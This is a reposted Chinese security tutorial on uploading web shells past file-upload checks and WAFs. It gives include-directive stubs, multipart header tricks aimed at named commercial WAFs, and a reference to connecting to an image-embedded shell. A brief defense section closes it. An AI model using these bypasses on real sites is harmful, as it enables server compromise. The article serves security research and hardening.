> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Mgo6Gvel9V0mxpsNIq1GlQ)

本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担!

今天就聊聊关于上传绕过 WAF 的姿势，WAF(Web Application Firewall) 简单的来说就是执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。上传绕过不算什么技术了，正所谓未知防，焉知攻，先来了解一下网站的防御措施吧！

一、Bypass Waf
------------

#### 1. 一般开发人员防御策略

客户端 javascript 校验 (一般只校验后缀名) 服务端校验 1 > 文件头 content-type 字段校验（image/gif）2 > 文件内容头校验（GIF89a）3 > 后缀名黑名单校验 4 > 后缀名白名单校验 5 > 自定义正则校验 6>WAF 设备校验（根据不同的 WAF 产品而定）

#### 2.Bypass

###### 2.1 有些 waf 不会防 asp/php/jsp 后缀的文件，但是他会检测里面的内容

eg1:  
1. 先上传一个内容为木马的 txt 后缀文件，因为后缀名的关系没有检验内容

2. 然后再上传一个. php 的文件，内容为

此时，这个 php 文件就会去引用 txt 文件的内容，从而绕过校验，下面列举包含的语法：

```
PHP
<?php Include("上传的txt文件路径");?>
ASP
<!--#include file="上传的txt文件路径" -->
JSP
<jsp:include page="上传的txt文件路径"/>
or
<%@include file="上传的txt文件路径"%>
```

访问 shell.php 就可以执行 php 代码  
尝试修改压缩文件后缀为 zip、phar、rar 发现都是可以的。

###### 2.2 WTS-WAF Bypass

```
Content-Disposition: form-data; name=“up_picture”; filename=“xss.php”
```

###### 2.3 Baidu cloud Bypass

发现百度云目前正在拦截后缀，百度云过上传还跟 <?php 前面是否有代码还有很大关系，在这里就不要废话了，大家自己去研究一下吧。  
Content-Disposition: form-data; name=“up_picture”; filename=“xss.jpg .Php”

百度云绕过就简单的很多很多，在对文件名大小写上面没有检测 php 是过了的，Php 就能过，或者 PHP，一句话自己合成图片马用 Xise 连接即可。

###### 2.4 阿里云 WAF

```
Content-Disposition: form-data; name=“img_crop_file”; fileContent-Type: image/jpeg
```

Bypass:  

```
Content-Disposition: form-data; name=“img_crop_file”; filename=“1.php”
```

Note: 你看的没错，删除 Content-Type: image/jpeg 即可绕过。  

###### 2.5 安全狗上传 Bypass(最新版不可绕)

```
Content-Disposition: form-data; name=“image”; fileContent-Type: image/png
```

Bypass:  

```
Content-Disposition: form-data; name=“image”; filename="085733uykwusqcs8vw8wky.png
```

C.php"  
Note: 删掉 ontent-Type: image/jpeg 只留下 c，将. php 加 c 后面即可，但是要注意额，双引号要跟着 c.php". 原理就不多说了，自己研究。

###### 2.6 云锁上传 Bypass

```
Content-Disposition: form-data; name=“up_picture”; filename=“xss.php”
```

二、Defense
---------

详细说一下 Type 绕过防御机制，其他的防御机制自己可以下去研究.

###### 1. 目录设为不可执行:

只要 web 容器无法解析该目录下的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，所以此点至关重要。

###### 2. 判断文件类型:

判断文件类型时，应结合 MIME-Type、后缀检查等方式、推荐使用白名单的方式。

###### 3. 用随机数改写:

文件上传如果要执行代码，则需要用户能访问到这个文件。在某些环境下，用户能上传，但是不能访问。

三、Summary
---------

研究 WAF 的绕过手段，是为了更好的提升 WAF 的防御能力。在研究突破的过程中，不要只是仅仅停留在正则表达式、基本漏洞原理，需要对涉及并深入更多的领域，例如 HTTP 协议理解和 PHP、Tomcat 对 HTTP 协议源码分析，MySQL 词法分析，和 Fuzz 的思路等。在此过程中，会有许多乐趣，也会有各方面能力的提升。

```
作者：南伯基尼
来源：https://blog.csdn.net/weixin_44203158/article/details/107213031
```

**推荐阅读**[**![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyIDG0WicDG27ztM2s7iaVSWKiaPdxYic8tYjCatQzf9FicdZiar5r7f7OgcbY4jFaTTQ3HibkFZIWEzrsGg/640?wx_fmt=png)**](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247497658&idx=1&sn=87d6b678c3dab4baeeb28ca81276d333&chksm=9acd2725adbaae334bd016bf907ed651a1b1529279a04cb45aad101025d2f09a4637e8810072&scene=21#wechat_redirect)

```
扫描关注乌雲安全


  
   
     
           
乌雲安全
           
乌雲安全，致力于红队攻防实战、内网渗透、代码审计、社工、安卓逆向、CTF比赛技巧、安全运维等技术干货分享，并预警最新漏洞，定期分享常用渗透工具、教程等资源。
           
66篇原创内容
         
   
   
公众号
 
 

觉得不错点个“赞”、“在看”哦
```